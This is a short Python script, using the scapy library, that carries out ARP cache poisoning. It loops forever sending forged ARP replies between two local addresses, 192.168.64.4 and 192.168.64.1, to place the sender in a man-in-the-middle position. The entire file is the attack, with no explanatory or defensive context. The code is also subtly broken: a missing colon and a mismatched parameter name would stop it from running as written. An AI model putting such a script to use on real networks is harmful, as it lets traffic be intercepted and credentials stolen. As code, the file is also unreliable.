import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    mac = answered_list[0][1].hwsrc
    return(mac)

def spoof(target_ip,Spoof_ip)
    mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)

while True:
    spoof(target_ip="192.168.64.4",spoof_ip="192.168.64.1")
    spoof(target_ip="192.168.64.1",spoof_ip="192.168.64.4")

